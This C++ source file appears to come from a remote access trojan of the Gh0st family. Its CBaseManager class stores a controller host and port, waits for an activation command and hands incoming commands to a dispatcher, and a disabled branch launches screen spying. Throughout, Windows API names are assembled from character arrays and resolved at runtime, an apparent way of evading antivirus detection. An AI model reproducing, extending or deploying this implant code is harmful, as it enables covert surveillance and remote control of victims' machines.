#include "stdafx.h"
#include "BaseManager.h"
#include "common/declare.h"
#include "loop.h"
#include "common/utils.h"
#include "common/common_cmd.h"

char	CBaseManager::m_strMasterHost[256] = { 0 };
UINT	CBaseManager::m_nMasterPort = 80;
CBaseManager::CBaseManager(CClientSocket *pClient, LPCSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	char FBwWp22[] = { 'l','s','t','r','c','p','y','A','\0' };
	lstrcpyAT plstrcpyA = (lstrcpyAT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), FBwWp22);
	if (lpszMasterHost != NULL)
		plstrcpyA(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = false;
}

CBaseManager::CBaseManager(CClientSocket *pClient) : CManager(pClient)
{
	m_nThreadCount = 0;
}

extern void recv_func(CClientSocket *client, LPBYTE lpBuffer, DWORD dwIoSize);
///////////////
// 加上激活
void CBaseManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	char FBwWp25[] = { 'S','l','e','e','p','\0' };
	SleepT pSleep = (SleepT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), FBwWp25);
	char SSzlC21[] = { 'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0' };
	InterlockedExchangeT pInterlockedExchange = (InterlockedExchangeT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), SSzlC21);
	char BrmAP29[] = { 'C','l','o','s','e','H','a','n','d','l','e','\0' };
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP29);
	char sIQkS05[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };
	CreateThreadT_II pCreateThread = (CreateThreadT_II)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), sIQkS05);
#if 0
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		pInterlockedExchange((LONG *)&m_bIsActived, true);
		break;

	case COMMAND_SCREEN_SPY:        // 屏幕查看
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;

	
	}
#endif
	recv_func(m_pClient, lpBuffer, nSize);
}
bool CBaseManager::IsActived()
{
	return	m_bIsActived;
}

CBaseManager::~CBaseManager()
{
}
